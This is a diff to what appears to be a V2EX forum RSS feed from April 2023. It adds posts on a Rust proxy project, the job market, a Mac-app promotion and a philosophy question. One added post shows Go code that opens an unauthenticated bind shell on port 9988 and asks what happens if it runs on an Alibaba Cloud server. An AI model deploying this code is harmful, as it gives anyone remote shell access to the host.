@@ -4,6 +4,40 @@
     <link>https://www.v2ex.com/?tab=all</link>
     <description></description>
     <item>
+      <title>这段代码放到服务器，是什么后果？如果是阿里云会直接报警，封掉服务器？ - Go 编程语言</title>
+      <link>https://www.v2ex.com/t/929790</link>
+      <description>&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func main() {&#xA;&#xA;&#x9;listener, err := net.Listen(&#34;tcp&#34;, &#34;:9988&#34;)&#xA;&#x9;if err != nil {&#xA;&#x9;&#x9;log.Fatalln(&#34;Unable to bind to port&#34;)&#xA;&#x9;}&#xA;&#x9;log.Println(&#34;Listening on 0.0.0.0:9988&#34;)&#xA;&#x9;for {&#xA;&#x9;&#x9;conn, err := listener.Accept()&#xA;&#x9;&#x9;log.Println(&#34;Received connection&#34;)&#xA;&#x9;&#x9;if err != nil {&#xA;&#x9;&#x9;&#x9;log.Fatalln(&#34;Unable to accept connection&#34;)&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;go handle_pipe(conn)&#xA;&#x9;}&#xA;}&#xA;func handle_pipe(conn net.Conn) {&#xA;&#x9;cmd := exec.Command(&#34;/bin/sh&#34;, &#34;-i&#34;)&#xA;&#xA;&#x9;rp, wp := io.Pipe() &#xA;&#x9;cmd.Stdin = conn    &#xA;&#x9;cmd.Stdout = wp    &#xA;&#x9;go io.Copy(conn, rp)&#xA;&#xA;&#x9;if err := cmd.Run(); err != nil {&#xA;&#x9;&#x9;log.Fatalln(err)&#xA;&#x9;}&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;</description>
+      <author>gitxuzan</author>
+      <pubDate>04 Apr 2023 09:22:34 +0000</pubDate>
+    </item>
+    <item>
+      <title>如何看待哲学上的：无用之用才是大用？ - 问与答</title>
+      <link>https://www.v2ex.com/t/929789</link>
+      <author>freepoint</author>
+      <pubDate>04 Apr 2023 09:22:33 +0000</pubDate>
+    </item>
+    <item>
+      <title>最近这几天招人的是不是多起来了？还是我的错觉？ - 职场话题</title>
+      <link>https://www.v2ex.com/t/929788</link>
+      <description>前阵子站里都没多少招人的，这两天一天能刷出好几个来</description>
+      <author>yukirus</author>
+      <pubDate>04 Apr 2023 09:21:31 +0000</pubDate>
+    </item>
+    <item>
+      <title>发现更好用的 Mac 应用 - macOS</title>
+      <link>https://www.v2ex.com/t/929787</link>
+      <description>对于喜欢 Mac 电脑的用户来说，寻找好用的 Mac 应用是一个永恒的话题。如果你也希望有一个推荐好用 Mac 应用的平台，那么就来关注优 APPER 公众号吧！我们致力于为你推荐最新的、最实用的 Mac 应用，并分享使用技巧，让你的 Mac 电脑更加好用！&lt;br /&gt;我们的推荐不仅仅局限于热门应用，还包括一些小众但非常实用的 Mac 应用。比如，你可能不知道有一款可以帮你快速截屏并进行编辑的工具；或者，你可能不知道有一款可以帮你管理你的密码和账号的应用。这些小众但非常实用的 Mac 应用，都能够让你的 Mac 电脑应用更加个性化、更加实用。&lt;br /&gt;除了推荐应用，我们还会分享一些使用技巧和小技巧，让你更好地使用你的 Mac 电脑和应用。无论你是新手还是老手，我们都会为你提供最合适的推荐和使用技巧。&lt;br /&gt;快来关注优 APPER 公众号，让我们一起发现更多好用的 Mac 应用吧！</description>
+      <author>studentBB</author>
+      <pubDate>04 Apr 2023 09:17:29 +0000</pubDate>
+    </item>
+    <item>
+      <title>我开发了一个代理服务器，性能和 Nginx 差不多。 - 分享创造</title>
+      <link>https://www.v2ex.com/t/929786</link>
+      <description>&lt;h1&gt;项目地址&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;项目在&lt;a href=&#34;https://github.com/lsk569937453/silverwind&#34; rel=&#34;nofollow&#34;&gt;这里&lt;/a&gt;。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h1&gt;特点&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;速度快,性能测试在&lt;a href=&#34;https://github.com/lsk569937453/silverwind/blob/main/benchmarks.md&#34; rel=&#34;nofollow&#34;&gt;这里&lt;/a&gt;。性能测试条件是在 Docker Swarm 中，使用 Docker Compose 部署服务(代理+后端+压测工具)，同时限制服务使用的 cpu 和内存(目前的限制是 4 核 cpu 和 8G 内存)。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;通过 Rest Api 实时修改配置(5 秒内生效)。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;涵盖了 Api 网关的所有功能(IP 黑白名单 /授权 /熔断,限流 /路由 /负载均衡)。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;通过 Rust 语言开发，理论上支持所有平台。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户界面友好（此处有吹牛嫌疑🙈），docker 容器下[代理+控制面]一键启动,docker-compose.yaml 文件在&lt;a href=&#34;https://github.com/lsk569937453/silverwind/blob/main/docker/dashboard/docker-compose.yaml&#34; rel=&#34;nofollow&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h1&gt;性能测试图&lt;/h1&gt;&#xA;&lt;p&gt;防止有些大佬们看不到性能对比图，直接把图贴在下面了。&lt;br/&gt;&#xA;ps:我也不知道为什么 Caddy 性能差这么多。Caddy 的配置在&lt;a href=&#34;https://github.com/lsk569937453/silverwind/tree/main/benchmarks/caddy&#34; rel=&#34;nofollow&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;h2&gt;Results using Hey&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;alt tag&#34; class=&#34;embedded_image&#34; loading=&#34;lazy&#34; referrerpolicy=&#34;no-referrer&#34; rel=&#34;noreferrer&#34; src=&#34;https://raw.githubusercontent.com/lsk569937453/image_repo/main/requestForSecond.png&#34;/&gt;&#xA;&lt;img alt=&#34;alt tag&#34; class=&#34;embedded_image&#34; loading=&#34;lazy&#34; referrerpolicy=&#34;no-referrer&#34; rel=&#34;noreferrer&#34; src=&#34;https://raw.githubusercontent.com/lsk569937453/image_repo/main/average-response-time.png&#34;/&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;alt tag&#34; class=&#34;embedded_image&#34; loading=&#34;lazy&#34; referrerpolicy=&#34;no-referrer&#34; rel=&#34;noreferrer&#34; src=&#34;https://raw.githubusercontent.com/lsk569937453/image_repo/main/Latency%20distribution.png&#34;/&gt;&lt;/p&gt;&#xA;&lt;h1&gt;附加&lt;/h1&gt;&#xA;&lt;h2&gt;界面有点丑陋😂，毕竟不是专业前端，请轻拍！&lt;/h2&gt;&#xA;&lt;h2&gt;希望路过的大佬们，给个 star 吧😍！&lt;/h2&gt;&#xA;</description>
+      <author>lsk569937453</author>
+      <pubDate>04 Apr 2023 09:15:39 +0000</pubDate>
+    </item>
+    <item>
       <title>免费使用 GPT-4,一个月 200k token 免费额度，支持 Markdown， Markdoc， MDX， HTML - 分享发现</title>
       <link>https://www.v2ex.com/t/929785</link>
       <description>&lt;p&gt;发现一个可以免费 GPT-4 的网站，&lt;a href=&#34;https://markprompt.com/&#34; rel=&#34;nofollow&#34;&gt;https://markprompt.com/&lt;/a&gt; ，而且也开源了，感兴趣的可以玩玩。关注我 &lt;a href=&#34;https://t.me/webexplorers&#34; rel=&#34;nofollow&#34;&gt;https://t.me/webexplorers&lt;/a&gt; 及时收到更多有用的信息。&lt;/p&gt;&#xA;</description>
